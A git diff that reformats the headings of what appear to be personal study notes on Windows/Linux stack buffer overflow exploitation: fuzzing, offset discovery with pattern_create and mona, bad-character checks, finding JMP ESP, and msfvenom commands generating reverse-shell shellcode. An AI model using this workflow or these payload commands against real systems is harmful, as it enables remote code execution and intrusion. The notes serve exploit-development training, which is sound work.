@@ -1,9 +1,9 @@
 # BOF
-### 1. Check buffer length to trigger overflow  
+**1. Check buffer length to trigger overflow**  
 
-### 2. Cofirm overflow length, append "A" * length  
+**2. Cofirm overflow length, append "A" * length**  
 
-### 3. Generate Offset to check EIP, ESP location  
+**3. Generate Offset to check EIP, ESP location**  
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
 
 	Record value on EIP, select ESP and click "Follow in Dump"  
@@ -12,9 +12,9 @@
 	Use !mona to find the offset after the overflow  
 	!mona findmsp  
 
-### 4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode
+**4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode**
 
-### 5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.
+**5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.**
 Add code:
 
 	badchar = [0x00]
@@ -22,7 +22,7 @@ Add code:
 		if ch not in badchar:
 			<payload> += chr(ch)
 
-### 6. Find JMP ESP address in the system.
+**6. Find JMP ESP address in the system.**
 	JMP ESP = FFE4
 
 	!mona jmp -r esp -cpb "\x00\x0A" << bad character
@@ -38,13 +38,13 @@ Add code:
 
 	Run again to check is the breakpoint triggered
 
-### 7. Add shellcode
+**7. Add shellcode**
 	Add a few \x90 before shellcode to avoid shellcode being modify
 
 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"
 
-### Bonus: Running out of shell code space?
+**Bonus: Running out of shell code space?**
 Use the front of payload instead
 1. Is there any register points to the front of our payload? EAX, EDX?
 2. Check JMP register address
